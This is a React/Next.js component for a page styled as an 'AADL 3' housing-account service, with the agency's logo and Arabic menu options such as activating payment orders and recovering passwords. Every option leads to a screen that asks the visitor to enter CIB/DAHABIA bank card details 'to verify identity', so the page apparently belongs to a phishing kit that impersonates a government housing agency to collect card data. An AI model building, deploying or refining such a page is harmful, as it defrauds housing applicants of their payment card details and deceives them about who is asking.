"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import Image from "next/image"
import { ArrowLeft, Eye, Download, FileText, Key } from "lucide-react"

interface ServiceSelectionStepProps {
  onVerification: () => void
  onActivated: () => void
  formData: any
}

type ServiceOption = "activate" | "download" | "appeal" | "password" | null

export function ServiceSelectionStep({ onVerification, onActivated, formData }: ServiceSelectionStepProps) {
  const [selectedOption, setSelectedOption] = useState<ServiceOption>(null)
  const [showChat, setShowChat] = useState(false)

  const services = [
    {
      id: "activate" as ServiceOption,
      title: "تفعيل ظهور نوع الشقة والأمر بالدفع",
      description: "للحسابات التي لم يظهر فيها النوع أو الأمر بالدفع",
      icon: Eye,
      color: "from-[#3a3a8f] to-[#4a4a9f]",
    },
    {
      id: "download" as ServiceOption,
      title: "تحميل الوصل",
      description: "تحميل وصل الدفع الخاص بالاكتتاب",
      icon: Download,
      color: "from-blue-500 to-blue-600",
    },
    {
      id: "appeal" as ServiceOption,
      title: "تقديم طعن حول نوع الشقة",
      description: "تغيير نوع السكن المخصص لك",
      icon: FileText,
      color: "from-amber-500 to-amber-600",
    },
    {
      id: "password" as ServiceOption,
      title: "حل مشكلة الرقم السري",
      description: "استرجاع أو تغيير كلمة المرور",
      icon: Key,
      color: "from-green-500 to-green-600",
    },
  ]

  const handleServiceClick = (serviceId: ServiceOption) => {
    setSelectedOption(serviceId)
    setShowChat(true)
  }

  const handleContinueVerification = () => {
    onVerification()
  }

  const handleBackToSelection = () => {
    setShowChat(false)
    setSelectedOption(null)
  }

  const getServiceTitle = () => {
    const service = services.find(s => s.id === selectedOption)
    return service?.title || ""
  }

  // Chat screen for verification
  if (showChat) {
    return (
      <div className="min-h-screen relative overflow-hidden">
        {/* Background */}
        <div 
          className="absolute inset-0"
          style={{
            background: "linear-gradient(135deg, #1a1a4e 0%, #2d2d7a 50%, #3a3a8f 100%)",
          }}
        />

        <div className="relative z-10 min-h-screen flex flex-col items-center justify-center p-4">
          <Card className="w-full max-w-md p-6 shadow-2xl bg-white/95 backdrop-blur-xl rounded-2xl border-0">
            {/* Header */}
            <div className="flex items-center mb-6">
              <button onClick={handleBackToSelection} className="p-2 hover:bg-gray-100 rounded-full transition">
                <ArrowLeft className="w-5 h-5 text-gray-600" />
              </button>
              <h2 className="text-lg font-bold text-[#3a3a8f] flex-1 text-center ml-[-28px]">التحقق من الهوية</h2>
            </div>

            {/* Chat message */}
            <div className="bg-gradient-to-br from-blue-50 to-indigo-50 rounded-xl p-5 mb-6 border-r-4 border-[#3a3a8f]">
              <p className="text-gray-800 text-right leading-relaxed text-sm" dir="rtl">
                مرحباً بك،
                <br /><br />
                لإتمام عملية <strong className="text-[#3a3a8f]">{getServiceTitle()}</strong>، يجب علينا التحقق من هويتك.
                <br /><br />
                يرجى إدخال بيانات بطاقة الدفع الخاصة بك <strong className="text-[#3a3a8f]">(CIB/DAHABIA)</strong> للتحقق من ملكية الحساب.
                <br /><br />
                <span className="text-xs text-gray-500">هذه الخطوة ضرورية لحماية حسابك وضمان أمان بياناتك.</span>
              </p>
            </div>

            {/* Continue button */}
            <Button
              onClick={handleContinueVerification}
              className="w-full bg-gradient-to-r from-[#3a3a8f] to-[#4a4a9f] hover:from-[#2d2d7a] hover:to-[#3a3a8f] text-white font-semibold py-3 h-12 rounded-xl transition-all shadow-lg"
            >
              متابعة التحقق
            </Button>
          </Card>

          {/* Footer */}
          <p className="text-xs text-blue-200/70 mt-6">خدمة إرشادية لمتابعة ملفات AADL 3</p>
        </div>
      </div>
    )
  }

  // Main service selection screen
  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Background */}
      <div 
        className="absolute inset-0"
        style={{
          background: "linear-gradient(135deg, #1a1a4e 0%, #2d2d7a 25%, #3a3a8f 50%, #4a4a9f 75%, #1a1a4e 100%)",
        }}
      />
      
      {/* Decorative elements */}
      <div className="absolute inset-0 opacity-10">
        <div className="absolute top-0 left-0 w-96 h-96 bg-white rounded-full blur-3xl -translate-x-1/2 -translate-y-1/2" />
        <div className="absolute bottom-0 right-0 w-96 h-96 bg-yellow-400 rounded-full blur-3xl translate-x-1/2 translate-y-1/2" />
      </div>

      {/* Grid pattern */}
      <div 
        className="absolute inset-0 opacity-5"
        style={{
          backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fillRule='evenodd'%3E%3Cg fill='%23ffffff' fillOpacity='1'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
        }}
      />

      <div className="relative z-10 min-h-screen flex flex-col items-center justify-center p-4">
        {/* Logo */}
        <div className="mb-6 relative">
          <div className="absolute inset-0 bg-white rounded-full blur-2xl opacity-20 scale-150" />
          <div className="relative bg-white p-3 rounded-xl shadow-2xl">
            <Image
              src="/aadl-logo.png"
              alt="AADL Logo"
              width={80}
              height={80}
              className="object-contain"
            />
          </div>
        </div>

        {/* Title */}
        <h1 className="text-xl font-bold text-center mb-1 text-white">متابعة حساب AADL 3</h1>
        <p className="text-sm text-blue-200 text-center mb-6">اختر الخدمة المناسبة حسب وضع حسابك</p>

        {/* Service buttons */}
        <div className="w-full max-w-md space-y-3">
          {services.map((service) => {
            const Icon = service.icon
            return (
              <button
                key={service.id}
                onClick={() => handleServiceClick(service.id)}
                className={`w-full bg-gradient-to-r ${service.color} hover:opacity-90 text-white font-semibold p-4 rounded-xl transition-all shadow-lg hover:shadow-xl hover:scale-[1.02] active:scale-[0.98]`}
                dir="rtl"
              >
                <div className="flex items-center gap-3">
                  <div className="bg-white/20 p-2 rounded-lg">
                    <Icon className="w-5 h-5" />
                  </div>
                  <div className="flex flex-col items-start text-right flex-1">
                    <span className="text-sm font-bold leading-tight">{service.title}</span>
                    <span className="text-xs text-white/70 mt-0.5">{service.description}</span>
                  </div>
                </div>
              </button>
            )
          })}
        </div>

        {/* Footer */}
        <p className="text-xs text-blue-200/70 mt-8">خدمة إرشادية لمتابعة ملفات AADL 3</p>
      </div>
    </div>
  )
}
